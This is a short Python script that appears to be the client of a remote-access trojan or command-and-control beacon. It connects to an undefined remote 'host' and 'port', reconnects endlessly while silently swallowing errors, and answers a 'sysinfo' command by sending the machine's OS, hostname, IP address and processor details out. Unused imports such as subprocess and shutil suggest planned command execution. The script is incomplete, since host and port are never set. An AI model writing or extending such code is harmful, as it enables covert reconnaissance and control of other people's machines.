#!/usr/bin/env python
import socket
import subprocess
import os
import shutil
import sys
from sys import *
from os import remove
import json
import platform
import pathlib

class CommandHandler():
    def connectionCheck(self) -> str:
        return str.encode("connection working")

    def sysinfo(self) -> json:
        try:
            data = {}
            data['platform'] = platform.system()
            data['platform-release'] = platform.release()
            data['platform-version'] = platform.version()
            data['architecture'] = platform.machine()
            data['hostname'] = socket.gethostname()
            data['ip-address'] = socket.gethostbyname(socket.gethostname())
            data['processor'] = platform.processor()
            data = json.dumps(data)
            return data
        except:
            return 'Error Getting Sysinfo'

class Client(CommandHandler):
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while True:
            try:
                self.sock.connect((host, port))
                self.commandHandler()
                self.sock.close()
            except:
                continue

    def commandHandler(self):
        while True:
            data = self.sock.recv(20480)
            print(data)
            if data.decode() == 'connection check':
                self.sock.send(self.connectionCheck())
            elif data.decode() == 'sysinfo':
                data = self.sysinfo()
                self.sock.send(data.encode())

def main():
    client = Client()

if __name__ == '__main__':
    main()